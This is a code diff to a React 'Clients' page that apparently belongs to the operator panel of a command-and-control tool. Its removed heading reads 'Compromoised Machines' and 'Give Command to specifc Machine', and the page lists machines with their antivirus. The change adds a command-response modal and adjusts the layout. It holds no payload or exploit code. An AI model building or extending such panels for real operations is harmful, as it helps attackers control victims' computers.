@@ -4,11 +4,12 @@ import ClientTab from '../components/ClientTab';
 import useFetch from '../hooks/useFetch';
 import { ClientDetail } from '../components/ClientDetail';
 import EditUsers from '../components/EditUsers';
+import CommandResponse from '../components/CommandResponse';
 
 function Clients() {
     const users =useFetch('http://localhost/api/clients/',["http://localhost/api/clients/"])||[];
     const [editUser, setEditUser] = useState(null);
-
+    const [responseModal, setResponseModal] = useState(null);
     const [searchUsers, setSearchUsers] = useState('');
 
     const [tabs, setTabs] = useState([]);
@@ -51,7 +52,11 @@ function Clients() {
             return;
         }
         setEditUser(null);
-        
+    }
+
+    
+    const handleResponseModal =(id=null)=>{
+        setResponseModal(id);
     }
 
     const filterUsers = users.filter(user => {
@@ -63,16 +68,8 @@ function Clients() {
 
     return (<>
            {editUser && <EditUsers id={editUser.id}  pcname={editUser.pcname} computer={editUser.computer} antivirus={editUser.antivirus} handelEditUser={handelEditUser} />}
+            {responseModal && <CommandResponse id ={responseModal} handleResponseModal={handleResponseModal} ></CommandResponse>}
             <div className="p-6 space-y-6 relative">
-                {/* header div */}
-                <div className="flex items-center justify-between">
-                    <div>
-                        <h1 className='text-3xl font-bold text-gray-900'> Compromoised Machines</h1>
-                        <p className="text-gray-600 mt-1">Give Command to specifc Machine</p>
-                    </div>
-                </div>
-                {/* header div ends */}
-
                 {/* search clients */}
                 <div className='flex items-center gap-4'>
                     <div className='relative flex-1 max-w-md'>
@@ -89,7 +86,7 @@ function Clients() {
                 {/* end search clients */}
 
                 {/* client list table */}
-                <div className='bg-white rounded-xl shadow-sm border border-gray-200  resize overflow-x-auto'>
+                <div className='bg-white rounded-xl shadow-sm border border-gray-200 resize overflow-x-auto' style={{maxHeight:"40vh"}}>
                     <div className="overflow-x-auto ">
                         <table className="w-full">
                             <thead className="bg-gray-50 border-b border-gray-200">
@@ -168,6 +165,7 @@ function Clients() {
                         deleteTab={deleteTab}
                         userLogs={userLogs}
                         addUserLogs={addUserLogs}
+                        handleResponseModal={handleResponseModal}
             >
 
             </ClientTab>
